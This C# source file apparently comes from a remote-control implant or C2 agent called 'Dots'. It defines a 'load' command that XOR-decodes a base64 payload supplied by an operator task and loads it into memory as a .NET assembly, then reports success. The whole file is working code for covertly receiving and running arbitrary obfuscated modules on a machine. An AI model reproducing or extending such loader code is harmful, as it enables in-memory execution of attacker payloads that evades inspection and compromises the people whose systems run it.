using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Dots.Models;

namespace Dots.Commands
{
    public class LoadCommand : DotsCommand
    {
        public override string Name => "load";

        private static byte[] Zor(string key, byte[] input)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }

        public override void Execute(TaskRequest task)
        {
            try
            {
                Assembly assembly = Assembly.Load(Zor(task.Params[0], Convert.FromBase64String(task.Params[1])));
                SetupResult(task, $"Succesfully loaded {assembly.FullName} module.");
            }
            catch (Exception e)
            {
                SetupError(task, e.Message);
            }
        }
    }
}
